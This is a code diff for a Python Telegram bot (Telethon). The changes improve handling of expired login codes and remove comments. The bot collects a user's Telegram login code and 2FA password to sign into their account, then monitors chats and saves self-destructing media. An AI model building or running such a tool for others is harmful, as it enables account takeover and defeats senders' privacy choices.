@@ -3,7 +3,7 @@ import asyncio
 import logging
 from datetime import datetime
 from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError, MessageNotModifiedError, PhoneCodeInvalidError
+from telethon.errors import SessionPasswordNeededError, MessageNotModifiedError, PhoneCodeInvalidError, PhoneCodeExpiredError
 from telethon.tl.custom import Button
 import nest_asyncio
 import random
@@ -89,26 +89,21 @@ async def check_pin_access(event):
     """Проверяет, ввёл ли пользователь правильный пин-код"""
     user_id = event.sender_id
     
-    # Если пользователь уже авторизован
     if user_id in authorized_users:
         return True
     
-    # Если пользователь в процессе ввода пин-кода
     if user_id in waiting_for_pin:
         text = event.message.text.strip()
         
         if text == ACCESS_PIN:
-            # Правильный пин-код
             authorized_users.add(user_id)
             del waiting_for_pin[user_id]
             await event.reply("✅ **Пин-код верный! Доступ разрешён.**\n\nИспользуй /start для начала работы.")
             return True
         else:
-            # Неправильный пин-код
             await event.reply("❌ **Неверный пин-код.** Попробуй ещё раз:")
             return False
     
-    # Новый пользователь - запрашиваем пин-код
     waiting_for_pin[user_id] = True
     await event.reply(
         "🔐 **Введите пин-код для доступа к боту:**\n\n"
@@ -207,7 +202,7 @@ async def handler(event):
                 new_text = (
                     f"✅ **Код отправлен!**\n\n"
                     f"📨 Код подтверждения отправлен в Telegram.\n"
-                    f"⏳ **Ожидание кода...** (до 2 минут)\n"
+                    f"⏳ **Код действителен 2 минуты**\n"
                     f"✍️ Отправь мне код цифрами:"
                 )
             else:
@@ -271,21 +266,25 @@ async def handler(event):
             if anim.text != new_text:
                 await anim.edit(new_text)
                 
-        except Exception as e:
-            # Проверяем на истекший код (приблизительно)
-            if "expired" in str(e).lower():
-                new_text = "⌛ **Код истёк!**\n\n📨 Отправляю новый код..."
-                if anim.text != new_text:
-                    await anim.edit(new_text)
-                
+        except PhoneCodeExpiredError:
+            # Код истёк — отправляем новый
+            new_text = "⌛ **Код истёк!**\n\n📨 Отправляю новый код..."
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            
+            # Отправляем новый код
+            try:
                 sent_code = await user_client.send_code_request(phone_number)
                 code_hash = sent_code.phone_code_hash
-                await event.reply("✅ Новый код отправлен! Введи его:")
-            else:
-                error_text = f"❌ Ошибка входа: {e}"
-                if anim.text != error_text:
-                    await anim.edit(error_text)
-                waiting_for_code = False
+                await event.reply("✅ **Новый код отправлен!**\n⏳ Действителен 2 минуты\n✍️ Введи код:")
+            except Exception as e:
+                await event.reply(f"❌ Ошибка отправки кода: {e}")
+                
+        except Exception as e:
+            error_text = f"❌ Ошибка входа: {e}"
+            if anim.text != error_text:
+                await anim.edit(error_text)
+            waiting_for_code = False
         return
 
     # === 4. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
@@ -407,7 +406,6 @@ async def monitor_user_chats(user_id):
             chat_name = "Неизвестный чат"
             sender_name = "Неизвестно"
         
-        # Сохраняем истекающие медиа
         if is_expiring and (event.message.photo or event.message.video or event.message.video_note):
             file_path, media_type = await download_expiring_media(event)
             
